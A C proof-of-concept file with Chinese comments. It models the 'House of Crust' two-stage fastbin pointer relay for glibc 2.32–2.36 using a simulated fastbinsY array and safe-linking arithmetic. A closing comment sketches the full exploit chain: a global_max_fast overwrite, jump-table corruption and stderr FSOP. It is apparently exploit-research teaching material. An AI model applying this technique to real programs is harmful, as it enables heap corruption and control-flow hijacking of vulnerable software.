/*
 * 本文件是 House of Crust 中两段式 fastbin 指针搬运的源码验证模型，
 * 适用于 glibc 2.32～2.36。
 *
 * 真实利用需要先覆盖 global_max_fast，让 fastbin 的索引能够远远超出
 * 正常范围，从而落到 libc 内部某个目标字段上。这里为了单独验证指针
 * 搬运这一步本身，用一个数组直接代表 fastbinsY，展开的顺序是：
 *
 *     源槽 -> 可编辑中转区 -> 修改指针值 -> 目标槽
 *
 * 代码中的每一次赋值，都能对应到 `_int_free` 或 `_int_malloc` 源码里的
 * 一条关键语句。
 */

#include <assert.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>

/* x86-64 的 fastbin 索引公式。 */
#define FASTBIN_INDEX(size) (((size) >> 4) - 2)

/* glibc 2.32 起 fastbin fd 的 safe-linking 公式。 */
#define PROTECT_PTR(position, pointer) \
    ((((size_t)(position)) >> 12) ^ ((size_t)(pointer)))

int main(void)
{
    /* 用这个数组直接表示 main_arena.fastbinsY 后面的连续 qword。 */
    size_t fastbins_y[64] = {0};

    /* victim 使用真实 malloc 地址，因此 fd 的 safe-linking key 来自真实堆地址。 */
    size_t *victim = malloc(0x30);

    /* victim[0] 就是 free 后的 fd 字段。 */
    size_t *fd = &victim[0];

    /* 三个索引分别代表源槽、可编辑的 libc 中转区，以及最终的目的地。 */
    size_t source_index = 8;
    size_t relay_index = 24;
    size_t destination_index = 40;

    /* 由 size = 2 * delta + 0x20 反算三个物理 chunk size。 */
    size_t source_size = source_index * 0x10 + 0x20;
    size_t relay_size = relay_index * 0x10 + 0x20;
    size_t destination_size = destination_index * 0x10 + 0x20;

    /* 确认三个 size 确实回到预期的 fastbin 索引。 */
    assert(FASTBIN_INDEX(source_size) == source_index);
    assert(FASTBIN_INDEX(relay_size) == relay_index);
    assert(FASTBIN_INDEX(destination_size) == destination_index);

    /* 源槽中原本保存着一个希望搬运的 libc 指针。 */
    size_t source_value = 0x7ffff7e12040;
    fastbins_y[source_index] = source_value;

    /*
     * House of Corrosion 的前置步骤已经让 victim 同时挂在中转区对应的
     * fastbin 头槽上。这里直接把这个结果当作已知的输入状态写进去，
     * 不再重复展开前面构造重叠 chunk 和自环链表的过程。
     */
    fastbins_y[relay_index] = (size_t)(victim - 2);

    /* ---------- 第一段：源槽 -> 可编辑中转区 ---------- */

    /* 把 victim 的物理 size 改成源槽对应的 size。 */
    victim[-1] = source_size | 1;

    /* 这一步对应 free 源码里的 victim->fd = PROTECT_PTR(&victim->fd, *source_head)。 */
    *fd = PROTECT_PTR(fd, fastbins_y[source_index]);

    /* `_int_free`：source_head 随后指向 victim 的 chunk 头。 */
    fastbins_y[source_index] = (size_t)(victim - 2);

    /* malloc 前把 victim size 改回中转区头槽对应的 size。 */
    victim[-1] = relay_size | 1;

    /* 中转区头槽当前取出的节点必须是 victim。 */
    assert(fastbins_y[relay_index] == (size_t)(victim - 2));

    /* `_int_malloc`：解码 victim->fd，并把结果写回中转区头槽。 */
    fastbins_y[relay_index] = PROTECT_PTR(fd, *fd);

    /* 第一段结束后，可编辑中转区中出现源槽的明文指针。 */
    assert(fastbins_y[relay_index] == source_value);

    /* Rust 前半链已经拿到中转区对应的 chunk，因此这里可以直接改写明文指针。 */
    size_t modified_value = 0x7ffff7e12ab0;
    fastbins_y[relay_index] = modified_value;

    /*
     * 同样地，House of Corrosion 的前置步骤也会让 victim 挂到目标槽对应的
     * fastbin 上，这正是第二段搬运开始之前需要具备的输入状态。
     */
    fastbins_y[destination_index] = (size_t)(victim - 2);

    /* ---------- 第二段：可编辑中转区 -> 目标槽 ---------- */

    /* 把 victim 的物理 size 改成可编辑中转区对应的 size。 */
    victim[-1] = relay_size | 1;

    /* `_int_free`：把中转区中修改后的明文指针编码进 victim->fd。 */
    *fd = PROTECT_PTR(fd, fastbins_y[relay_index]);

    /* `_int_free`：中转区头槽现在指向 victim。 */
    fastbins_y[relay_index] = (size_t)(victim - 2);

    /* malloc 前把 victim size 改成目标槽对应的 size。 */
    victim[-1] = destination_size | 1;

    /* 目标槽当前取出的节点必须是 victim。 */
    assert(fastbins_y[destination_index] == (size_t)(victim - 2));

    /* `_int_malloc`：解码 victim->fd，并把修改后的值写入目标槽。 */
    fastbins_y[destination_index] = PROTECT_PTR(fd, *fd);

    /* 最终目的地必须精确得到修改后的指针。 */
    assert(fastbins_y[destination_index] == modified_value);

    printf("[+] 两段指针搬运完成\n");

    /* victim 的真实 size 已被破坏，教学 PoC 直接退出，不再 free。 */
    return 0;
}

/*
 * ======================== 地址换算与完整链伪代码 ========================
 *
 * 这里不再提供独立的地址计算器，拿到附件的真实地址后，直接按下面这组
 * 公式逐个手算即可：
 *
 *     delta = target - &main_arena.fastbinsY[0]；
 *     assert(delta >= 0 && delta % 8 == 0)；          // 目标必须落在可索引的槽边界上
 *     chunk_size = 2 * delta + 0x20；
 *     malloc_request = (chunk_size & ~7) - 0x10；     // 换算回应该传给 malloc 的请求大小
 *     safe_linking_key = &victim->fd >> 12；
 *
 * 对 source、editable_zone、destination 这三个地址分别算出各自的
 * size/request 之后，搬运顺序固定不变：
 *
 *     source -> editable_zone -> 修改明文指针 -> destination；
 *
 * 原版 Crust 完整利用链中，围绕堆布局要做的事情依次是：
 *
 *     先跑完 Rust 前半的两轮 TSU+/TSU 和两轮 largebin；
 *     由此取得 tcache_perthread_struct 内部的 chunk 以及邻近的 libc 指针；
 *     覆盖 global_max_fast，让远超正常范围的 fastbin 索引成为可能；
 *     准备好可以反复改写 size/fd 的 victim，外加大约 0x4000 大小的安全值区域；
 *     用本文件验证过的两段式算法完成搬运，进而改写跳转表或相关辅助对象；
 *     再把 global_max_fast 恢复原值，触发 stderr 的 FSOP；
 *
 * 走到这一步之后，还必须逐项确认最终的控制流真的可行：`_IO_file_jumps`
 * 所在的映射确实可写，目标 gadget 与当前寄存器状态相符，以及对 libc 地址
 * 低四位的猜测确实命中。另外要注意，glibc 2.37 起 global_max_fast 被
 * 收窄成 uint8_t，能够访问到的范围最远也只到 fastbinsY+0x68 附近，
 * 这条核心搬运手法到此就走不下去了。
 */
